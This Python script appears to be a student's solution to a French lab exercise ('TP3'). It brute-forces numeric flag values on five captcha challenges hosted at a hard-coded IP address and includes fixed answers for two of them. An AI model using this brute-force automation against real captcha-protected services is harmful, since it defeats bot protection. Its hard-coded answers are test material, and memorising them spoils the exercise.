import os
import re
import time

from src.tp3.utils.config import logger
from src.tp3.utils.session import Session


DEFAULT_BASE_URL = "http://31.220.95.27:9002"
DEFAULT_CHALLENGES = "1,2,3,4,5"
DEFAULT_FLAG_START = 1000
DEFAULT_FLAG_END = 2000
DEFAULT_RETRIES_PER_FLAG = 3
CHALLENGE_FLAG_RANGES = {
    "1": (1000, 2000),
    "2": (2000, 3000),
    "3": (3000, 4000),
}
CHALLENGE_FIXED_FLAGS = {
    "4": 7629,
    "5": 8632,
}


def build_challenge_urls(
    base_url: str = DEFAULT_BASE_URL,
    challenge_ids: str = DEFAULT_CHALLENGES,
) -> dict[str, str]:
    base_url = base_url.rstrip("/")
    return {
        challenge_id: f"{base_url}/captcha{challenge_id}/"
        for challenge_id in challenge_ids.replace(" ", "").split(",")
        if challenge_id
    }


def solve_challenge(
    url: str,
    *,
    flag_start: int,
    flag_end: int,
    retries_per_flag: int,
    delay_seconds: float,
) -> str:
    attempts = (flag_end - flag_start + 1) * retries_per_flag
    attempt = 0
    session = Session(url)

    for flag_candidate in range(flag_start, flag_end + 1):
        for retry in range(1, retries_per_flag + 1):
            attempt += 1
            logger.info(
                "Attempt %s/%s for %s with flag=%s retry=%s/%s",
                attempt,
                attempts,
                url,
                flag_candidate,
                retry,
                retries_per_flag,
            )
            session.flag_value = str(flag_candidate)
            session.prepare_request()
            session.submit_request()

            if session.process_response():
                return session.get_flag()

            if session.last_result == "wrong_flag":
                break

            if delay_seconds > 0:
                time.sleep(delay_seconds)

    raise RuntimeError(
        f"Aucun flag trouvé pour {url} entre {flag_start} et {flag_end}"
    )


def get_flag_range(
    challenge_id: str,
    start_env: str | None,
    end_env: str | None,
) -> tuple[int, int]:
    if start_env is not None and end_env is not None:
        return int(start_env), int(end_env)
    if challenge_id in CHALLENGE_FIXED_FLAGS:
        flag_value = CHALLENGE_FIXED_FLAGS[challenge_id]
        return flag_value, flag_value
    return CHALLENGE_FLAG_RANGES.get(
        challenge_id,
        (DEFAULT_FLAG_START, DEFAULT_FLAG_END),
    )


def is_fixed_flag_challenge(challenge_id: str) -> bool:
    return challenge_id in CHALLENGE_FIXED_FLAGS


def extract_flag_payload(flag_value: str) -> str:
    """Retourne le contenu entre accolades d'un flag, si présent."""
    match = re.search(r"\{\s*([^}]+?)\s*\}", flag_value)
    return match.group(1).strip() if match else ""


def magic_word_for_challenge(
    challenge_id: str,
    flags: dict[str, str],
    current_magic_word: str,
) -> str:
    """Déduit le Magic-Word à partir des flags déjà trouvés."""
    if challenge_id == "4":
        return extract_flag_payload(flags.get("3", "")) or current_magic_word
    if challenge_id == "5":
        return extract_flag_payload(flags.get("4", "")) or current_magic_word
    return current_magic_word


def main() -> int:
    logger.info("Starting TP3")

    base_url = os.getenv("TP3_BASE_URL", DEFAULT_BASE_URL)
    challenge_ids = os.getenv("TP3_CHALLENGES", DEFAULT_CHALLENGES)
    flag_start_env = os.getenv("TP3_FLAG_START")
    flag_end_env = os.getenv("TP3_FLAG_END")
    retries_per_flag = int(
        os.getenv("TP3_RETRIES_PER_FLAG", str(DEFAULT_RETRIES_PER_FLAG))
    )
    delay_seconds = float(os.getenv("TP3_DELAY_SECONDS", "0.2"))

    flags: dict[str, str] = {}
    magic_word = os.getenv("TP3_MAGIC_WORD", "")
    for challenge_id, url in build_challenge_urls(base_url, challenge_ids).items():
        magic_word = magic_word_for_challenge(challenge_id, flags, magic_word)
        if challenge_id in {"4", "5"} and magic_word:
            os.environ["TP3_MAGIC_WORD"] = magic_word
            logger.info("Magic-Word configured for challenge %s", challenge_id)

        flag_start, flag_end = get_flag_range(challenge_id, flag_start_env, flag_end_env)
        logger.info("Solving captcha challenge %s: %s", challenge_id, url)
        if is_fixed_flag_challenge(challenge_id) and flag_start == flag_end:
            logger.info("Flag value for challenge %s: %s", challenge_id, flag_start)
        else:
            logger.info("Flag range for challenge %s: %s..%s", challenge_id, flag_start, flag_end)
        flags[challenge_id] = solve_challenge(
            url,
            flag_start=flag_start,
            flag_end=flag_end,
            retries_per_flag=retries_per_flag,
            delay_seconds=delay_seconds,
        )
        logger.info("Flag challenge %s: %s", challenge_id, flags[challenge_id])

    logger.info("TP3 finished: %s", flags)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
